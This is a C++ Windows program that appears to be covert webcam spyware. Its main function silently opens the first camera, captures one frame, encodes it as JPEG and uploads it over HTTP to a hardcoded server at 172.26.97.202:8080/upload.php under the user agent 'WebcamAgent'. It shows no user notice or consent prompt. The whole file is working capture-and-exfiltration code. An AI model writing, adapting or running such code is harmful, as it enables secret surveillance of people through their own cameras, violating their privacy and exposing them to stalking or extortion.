#include <windows.h>
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <wininet.h>
#include <iostream>
#include <vector>
#include <string>

typedef unsigned char uchar;

#define STB_IMAGE_WRITE_IMPLEMENTATION
#include "stb_image_write.h"

#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfreadwrite.lib")
#pragma comment(lib, "mfuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "wininet.lib")

const std::string SERVER_URL_HOST = "172.26.97.202"; 
const int SERVER_PORT = 8080;                                   
const std::string SERVER_URL_PATH = "/upload.php";              

// Callback structure for stb_image memory write
struct MemBuffer {
    std::vector<uchar> data;
};

void write_to_buffer(void* context, void* data, int size) {
    MemBuffer* buf = static_cast<MemBuffer*>(context);
    uchar* ptr = static_cast<uchar*>(data);
    buf->data.insert(buf->data.end(), ptr, ptr + size);
}

bool SendImageToServer(const std::vector<uchar>& imageBuffer) {
    HINTERNET hInternet = InternetOpenA("WebcamAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hConnect = InternetConnectA(hInternet, SERVER_URL_HOST.c_str(), SERVER_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }

    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", SERVER_URL_PATH.c_str(), NULL, NULL, NULL, flags, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    std::string headers = "Content-Type: image/jpeg\r\n";
    BOOL sent = HttpSendRequestA(
        hRequest, 
        headers.c_str(), 
        (DWORD)headers.length(), 
        (LPVOID)imageBuffer.data(), 
        (DWORD)imageBuffer.size()
    );

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return sent == TRUE;
}

bool CaptureWebcamFrame(std::vector<uchar>& outJpegBuffer) {
    if (FAILED(MFStartup(MF_VERSION))) return false;

    IMFAttributes* pAttributes = NULL;
    IMFActivate** ppDevices = NULL;
    UINT32 count = 0;

    if (FAILED(MFCreateAttributes(&pAttributes, 1))) {
        MFShutdown();
        return false;
    }

    pAttributes->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
    
    if (FAILED(MFEnumDeviceSources(pAttributes, &ppDevices, &count)) || count == 0) {
        pAttributes->Release();
        MFShutdown();
        return false;
    }

    IMFMediaSource* pSource = NULL;
    if (FAILED(ppDevices[0]->ActivateObject(IID_PPV_ARGS(&pSource)))) {
        ppDevices[0]->Release();
        CoTaskMemFree(ppDevices);
        pAttributes->Release();
        MFShutdown();
        return false;
    }

    IMFSourceReader* pReader = NULL;
    if (FAILED(MFCreateSourceReaderFromMediaSource(pSource, NULL, &pReader))) {
        pSource->Release();
        ppDevices[0]->Release();
        CoTaskMemFree(ppDevices);
        pAttributes->Release();
        MFShutdown();
        return false;
    }

    // Try setting MJPG format first, fallback to RGB24 if needed
    IMFMediaType* pType = NULL;
    MFCreateMediaType(&pType);
    pType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
    pType->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_MJPG);
    
    HRESULT hr = pReader->SetCurrentMediaType((DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM, NULL, pType);
    pType->Release();

    bool isMjpg = SUCCEEDED(hr);

    if (!isMjpg) {
        MFCreateMediaType(&pType);
        pType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
        pType->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_RGB24);
        hr = pReader->SetCurrentMediaType((DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM, NULL, pType);
        pType->Release();

        if (FAILED(hr)) {
            pReader->Release();
            pSource->Release();
            ppDevices[0]->Release();
            CoTaskMemFree(ppDevices);
            pAttributes->Release();
            MFShutdown();
            return false;
        }
    }

    IMFSample* pSample = NULL;
    DWORD streamIndex, flags;
    LONGLONG timestamp;
    
    hr = E_FAIL;
    for (int attempt = 0; attempt < 30; ++attempt) {
        if (pSample) {
            pSample->Release();
            pSample = NULL;
        }
        
        hr = pReader->ReadSample((DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, &streamIndex, &flags, &timestamp, &pSample);
        if (SUCCEEDED(hr) && pSample != NULL) {
            break;
        }
        Sleep(100);
    }
    
    bool success = false;
    if (SUCCEEDED(hr) && pSample) {
        IMFMediaBuffer* pBuffer = NULL;
        if (SUCCEEDED(pSample->ConvertToContiguousBuffer(&pBuffer))) {
            BYTE* pRawData = NULL;
            DWORD maxLength = 0, currentLength = 0;
            if (SUCCEEDED(pBuffer->Lock(&pRawData, &maxLength, &currentLength))) {
                
                if (isMjpg) {
                    outJpegBuffer.assign(pRawData, pRawData + currentLength);
                    success = !outJpegBuffer.empty();
                } else {
                    IMFMediaType* pCurrentType = NULL;
                    pReader->GetCurrentMediaType((DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM, &pCurrentType);
                    UINT32 width = 0, height = 0;
                    MFGetAttributeSize(pCurrentType, MF_MT_FRAME_SIZE, &width, &height);
                    
                    LONG lStride = 0;
                    pCurrentType->GetUINT32(MF_MT_DEFAULT_STRIDE, (UINT32*)&lStride);
                    pCurrentType->Release();

                    if (lStride == 0) lStride = width * 3;

                    std::vector<BYTE> cleanRgb(width * height * 3);
                    LONG absStride = abs(lStride);

                    for (UINT32 y = 0; y < height; ++y) {
                        BYTE* srcRow;
                        if (lStride < 0) {
                            srcRow = pRawData + (height - 1 - y) * absStride;
                        } else {
                            srcRow = pRawData + y * absStride;
                        }
                        BYTE* destRow = cleanRgb.data() + y * width * 3;
                        memcpy(destRow, srcRow, width * 3);
                    }

                    MemBuffer memBuf;
                    stbi_write_func* func = write_to_buffer;
                    stbi_write_jpg_to_func(func, &memBuf, width, height, 3, cleanRgb.data(), 85);
                    
                    outJpegBuffer = memBuf.data;
                    success = !outJpegBuffer.empty();
                }

                pBuffer->Unlock();
            }
            pBuffer->Release();
        }
        pSample->Release();
    }

    pReader->Release();
    pSource->Release();
    ppDevices[0]->Release();
    CoTaskMemFree(ppDevices);
    pAttributes->Release();
    MFShutdown();

    return success;
}

int main() {
    std::vector<uchar> jpegBuffer;
    if (!CaptureWebcamFrame(jpegBuffer)) {
        return -1;
    }

    SendImageToServer(jpegBuffer);
    return 0;
}
